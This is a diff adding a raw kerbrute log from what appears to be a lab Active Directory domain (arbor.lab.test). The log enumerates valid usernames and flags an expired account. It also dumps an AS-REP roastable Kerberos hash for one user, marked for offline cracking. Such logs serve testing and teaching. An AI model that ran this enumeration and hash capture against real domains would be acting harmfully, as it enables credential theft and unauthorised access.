@@ -1,0 +1,20 @@
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 11/16/26 - Ronnie Flathers @ropnop
+
+2026/11/16 01:03:17 >  Using KDC(s):[0m
+2026/11/16 01:03:17 >  	10.99.56.13:88
+[0m
+[32m2026/11/16 01:03:17 >  [+] VALID USERNAME:	 rowan.ash@arbor.lab.test[0m
+[32m2026/11/16 01:03:17 >  [+] VALID USERNAME:	 willow.reed@arbor.lab.test[0m
+[32m2026/11/16 01:03:17 >  [+] VALID USERNAME:	 elm.stone@arbor.lab.test[0m
+[31m2026/11/16 01:03:17 >  [!] alder.fern@arbor.lab.test - KRB Error: (23) KDC_ERR_KEY_EXPIRED Password has expired; change password to reset[0m
+[32m2026/11/16 01:03:22 >  [+] hazel.birch has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$hazel.birch@ARBOR.LAB.TEST:6a0b33b8cfb9e7fde5ecab3f7c4787b3$fe498d4eabceb2fe2e97cd8e3dc6f1d54b53bfb8ccae82bcef3e183e56dc6d394282ae3ab76cb0e290d020f2d58f46ec190773ac0630caf61c1d6e69707f15c4127d1e837cd6f5c64a4f88a26c68a67da7a22f566a896c74be5281108c7c8dbc95d55b38f3782829188e45ca51faf04ef1326d0bf9f4d8c39be732787660dcd9ae54233ead2696ad5ec14bcbb5c168dbe4413f850ac5a9c8b12654e38243f870523ce5b024b6f057f10bb15743f87d1eec04a7a46f6e30c3167c2f0b35e16d43e56ac8f4b2f8063fa56be34049c315097412ee9a8ba7a3af28543d03d661[0m
+[32m2026/11/16 01:03:22 >  [+] VALID USERNAME:	 hazel.birch@arbor.lab.test[0m
+2026/11/16 01:03:22 >  Done! Tested 6 usernames (4 valid) in 5.033 seconds[0m
